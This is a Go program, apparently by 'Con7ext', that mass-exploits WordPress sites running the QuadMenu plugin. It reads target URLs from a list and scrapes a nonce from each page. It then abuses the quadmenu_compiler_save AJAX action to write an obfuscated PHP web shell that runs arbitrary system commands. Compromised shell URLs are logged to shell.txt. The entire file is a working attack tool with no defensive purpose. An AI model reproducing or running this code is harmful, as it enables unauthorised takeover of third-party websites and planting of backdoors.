package main

// By Con7ext
// Ref: https://sh3llcon.org/la-debilidad-de-wordpress/
import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"regexp"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/tidwall/gjson"
)

var (
	total      int
	counter               = 0
	wg                    = sync.WaitGroup{}
	seededRand *rand.Rand = rand.New(
		rand.NewSource(time.Now().UnixNano()))
	tr = &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
)

func randStr(length int) string {
	letters := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	str := make([]byte, length)
	for i := range str {
		str[i] = letters[seededRand.Intn(len(letters))]
	}
	return string(str)
}
func green(str string) string {
	return "\033[1;32m" + str + "\033[0m"
}
func red(str string) string {
	return "\033[1;31m" + str + "\033[0m"
}
func shellUpload(uri string, nonce string) (string, error) {
	shellName := randStr(7) + "-njay.php"
	shellContent := url.QueryEscape("<?php $_ = \"]\" ^ \";\"; $__ = \".\" ^ \"^\"; $___ = (\"|\" ^ \"#\") . (\":\" ^ \"}\") . (\"~\" ^ \";\") . (\"{\" ^ \"/\"); ${$___}[$_](${$___}[$__]);")
	client := &http.Client{Transport: tr}
	buildQuery := fmt.Sprintf("/wp-admin/admin-ajax.php?action=quadmenu_compiler_save&nonce=%s&output[imports][0]=%s&output[css]=%s", nonce, shellName, shellContent)
	req, err := client.Get(uri + buildQuery)
	if err != nil {
		return "Cannot Connect to uri", err
	}
	defer req.Body.Close()
	body, err := ioutil.ReadAll(req.Body)
	if err != nil {
		return "Unknow Error", err
	}
	if req.StatusCode == 200 {
		if strings.Contains(string(body), "saved_notice admin-notice notice-green") {
			notification_bar := gjson.Get(string(body), "notification_bar").Str
			regex, err := regexp.Compile("(/wp-content/.*.php)")
			shellLocation := regex.FindStringSubmatch(notification_bar)
			if shellLocation == nil {
				return "Cannot Get Shell Location", err
			}
			return uri + "" + shellLocation[1], nil
		} else {
			return "Cannot Upload Shell", fmt.Errorf("Upload Shell Failed.")
		}
	} else {
		return "Cannot Upload Shell", fmt.Errorf("Upload Shell Failed.")
	}
}
func getNonce(uri string) (bool, string, error) {
	client := &http.Client{Transport: tr}
	req, err := client.Get(uri)
	req.Header.Add("User-Agent", "Mozilla")
	if err != nil {
		return false, "Unknow Error!", err
	}
	defer req.Body.Close()
	body, err := ioutil.ReadAll(req.Body)
	if err != nil {
		return false, "Cannot read respone body", err
	}
	regex, err := regexp.Compile("quadmenu.*=.*\"nonce\":\"(.+?)\"")
	res := regex.FindStringSubmatch(string(body))
	if res == nil {
		return false, "cannot get nonce", err
	}
	return true, res[1], nil
}
func main() {
	fmt.Println("Usage of shell: shell?f=system&p=ls -la")
	fmt.Println("Some website maybe 403/shell downloaded.")
lists:
	teriminate()
	list := bufio.NewReader(os.Stdin)
	fmt.Print("List : ")
	req, _ := list.ReadString('\n')
	stdout := strings.Replace(req, "\n", "", -1)
	if _, err := os.Stat(stdout); os.IsNotExist(err) {
		fmt.Println(red("File Not Exits."))
		goto lists
	}
	file, err := os.Open(stdout)
	if err != nil {
		panic(err)
	}
	defer file.Close()
	urls := bufio.NewScanner(file)
	tampung := []string{}
	for urls.Scan() {
		tampung = append(tampung, urls.Text())
	}
	total = len(tampung)
	for _, uri := range tampung {
		wg.Add(1)
		go func(uri string) {
			status, nonce, err := getNonce(uri)
			if err != nil {
				counter += 1
				fmt.Printf("[%d/%d] %s -> %s\n", counter, total, uri, red(nonce))
			} else {
				if !status {
					counter += 1
					fmt.Printf("[%d/%d] %s -> %s\n", counter, total, uri, red(nonce))
				} else {
					msg, err := shellUpload(uri, nonce)
					if err != nil {
						counter += 1
						fmt.Printf("[%d/%d] %s -> %s\n", counter, total, uri, red(msg))
					} else {
						counter += 1
						fmt.Printf("[%d/%d] %s -> %s\n", counter, total, uri, green(msg))
						makeFile("shell.txt", msg+"\n")
					}
				}
			}
			wg.Done()
		}(uri)
	}
	wg.Wait()
}
func makeFile(filename string, content string) bool {
	file, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return false
	}
	if _, err := file.Write([]byte(content)); err != nil {
		return false
	}
	if err := file.Close(); err != nil {
		return false
	}
	return true
}
func teriminate() {
	c := make(chan os.Signal)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-c
		fmt.Println("\rCtrl+C pressed, exiting.")
		os.Exit(0)
	}()
}
